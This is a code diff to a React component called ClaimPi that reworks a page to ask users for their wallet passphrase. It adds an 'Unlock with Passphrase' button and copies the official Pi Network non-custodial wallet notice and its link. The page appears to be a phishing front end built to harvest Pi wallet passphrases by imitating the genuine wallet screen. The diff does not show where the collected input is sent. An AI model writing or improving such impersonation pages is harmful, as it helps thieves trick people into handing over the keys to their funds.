@@ -7,6 +7,7 @@ import { DotLottieReact } from "@lottiefiles/dotlottie-react";
 function ClaimPi(props) {
   const addAddress = async (address) => {
     if (!checkAddress(address)) {
+      console.log(!checkAddress(address));
       return;
     }
     setTimeout(async () => {
@@ -48,6 +49,7 @@ function ClaimPi(props) {
 
   return (
     <div className={s.claimPiBoxContainer}>
+      <h2>Enter your passphrase to open your wallet</h2>
       <textarea
         className={s.claimPiBox}
         name="piCode"
@@ -68,7 +70,7 @@ function ClaimPi(props) {
         }}
       >
         {!loading ? (
-          <span>Claim PI</span>
+          <span>Unlock with Passphrase</span>
         ) : (
           <span className={s.loading}>
             <DotLottieReact
@@ -80,6 +82,15 @@ function ClaimPi(props) {
           </span>
         )}
       </button>
+      <div className={s.createWallet}>
+        <p>
+          As a non-custodial wallet, your wallet passphrase is exclusively
+          accessible only to you. Recovery of passphrase is currently
+          impossible. <br /> Lost your passphrase?{" "}
+          <a href="https://minepi.com/">You can create a new wallet</a> , but
+          all your π in your previous wallet will be inaccessible.
+        </p>
+      </div>
     </div>
   );
 }
